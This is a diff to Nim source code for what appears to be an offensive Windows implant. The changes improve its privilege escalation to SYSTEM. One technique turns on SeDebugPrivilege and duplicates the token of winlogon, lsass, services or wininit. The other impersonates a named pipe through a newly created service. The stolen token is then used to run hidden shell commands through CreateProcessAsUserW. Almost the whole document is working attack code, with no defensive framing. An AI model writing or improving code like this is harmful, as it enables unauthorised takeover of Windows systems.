@@ -51,6 +51,16 @@ when defined(windows):
     lpProcessInformation: ptr PROCESS_INFORMATION
   ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
 
+  proc CreateProcessAsUserW(
+    hToken: HANDLE,
+    lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
+    lpProcessAttributes: pointer, lpThreadAttributes: pointer,
+    bInheritHandles: WINBOOL, dwCreationFlags: DWORD,
+    lpEnvironment: pointer, lpCurrentDirectory: LPCWSTR,
+    lpStartupInfo: ptr STARTUPINFOW,
+    lpProcessInformation: ptr PROCESS_INFORMATION
+  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
+
   proc OpenThreadToken(
     ThreadHandle: HANDLE, DesiredAccess: DWORD,
     OpenAsSelf: WINBOOL, TokenHandle: ptr HANDLE
@@ -118,12 +128,14 @@ proc runShell*(cmd: string): string =
         si.hStdOutput = hWrite; si.hStdError = hWrite
         si.hStdInput = INVALID_HANDLE_VALUE
         var pi: PROCESS_INFORMATION; zeroMem(addr pi, sizeof(pi))
-        let ok = CreateProcessWithTokenW(gSystemToken, 0, nil,
-          newWideCString(fullCmd), CREATE_NO_WINDOW, nil, nil, addr si, addr pi)
+        discard ImpersonateLoggedOnUser(gSystemToken)
+        let ok = CreateProcessAsUserW(gSystemToken, nil, newWideCString(fullCmd),
+          nil, nil, WINBOOL(1), CREATE_NO_WINDOW, nil, nil, addr si, addr pi)
+        discard RevertToSelf()
         discard CloseHandle(hWrite)
         if ok == 0:
           discard CloseHandle(hRead)
-          return "[error: CreateProcessWithTokenW " & $GetLastError() & "]"
+          return "[error: CreateProcessAsUserW " & $GetLastError() & "]"
         var buf = newStringOfCap(4096)
         var tmp = newString(512)
         var nr: DWORD
@@ -766,16 +778,20 @@ when defined(windows):
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
       discard enablePriv(hSelf, "SeDebugPrivilege"); discard CloseHandle(hSelf)
     block t1:
-      let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-      if snap == INVALID_HANDLE_VALUE: break t1
-      defer: discard CloseHandle(snap)
-      var pe: PROCESSENTRY32W; pe.dwSize = DWORD(sizeof(pe))
+      const targets = ["winlogon.exe", "lsass.exe", "services.exe", "wininit.exe"]
       var sysPid: DWORD = 0
-      if Process32FirstW(snap, addr pe).bool:
-        while true:
-          if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == "winlogon.exe":
-            sysPid = pe.th32ProcessID; break
-          if not Process32NextW(snap, addr pe).bool: break
+      var matchName = ""
+      for tgt in targets:
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if snap == INVALID_HANDLE_VALUE: continue
+        var pe: PROCESSENTRY32W; pe.dwSize = DWORD(sizeof(pe))
+        if Process32FirstW(snap, addr pe).bool:
+          while true:
+            if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == tgt:
+              sysPid = pe.th32ProcessID; matchName = tgt; break
+            if not Process32NextW(snap, addr pe).bool: break
+        discard CloseHandle(snap)
+        if sysPid != 0: break
       if sysPid == 0: break t1
       let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sysPid)
       if hProc == 0: break t1
@@ -794,7 +810,7 @@ when defined(windows):
       discard CloseHandle(hDup)
       if gSystemToken != 0: discard CloseHandle(gSystemToken)
       gSystemToken = hPrim
-      return "[+] T1 SYSTEM (winlogon PID=" & $sysPid & ")"
+      return "[+] T1 SYSTEM (" & matchName & " PID=" & $sysPid & ")"
 
     # ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
     let rnd: uint32 = GetTickCount().uint32 xor GetCurrentProcessId().uint32
@@ -832,10 +848,13 @@ when defined(windows):
     zeroMem(addr ov, sizeof(ov))
     ov.hEvent = hEvent
 
-    discard StartServiceW(hSvc, 0, nil)
     discard ConnectNamedPipe(hPipe, addr ov) # async — ERROR_IO_PENDING expected
+    discard StartServiceW(hSvc, 0, nil)
 
-    let wr = WaitForSingleObject(hEvent, DWORD(5000))
+    var wr = WaitForSingleObject(hEvent, DWORD(2000))
+    if wr != WAIT_OBJECT_0:
+      discard StartServiceW(hSvc, 0, nil)
+      wr = WaitForSingleObject(hEvent, DWORD(3000))
     if wr != WAIT_OBJECT_0:
       discard CancelIoEx(hPipe, addr ov)
       return "[-] T1+T2 failed (T2 pipe timeout res=" & $wr & ")"
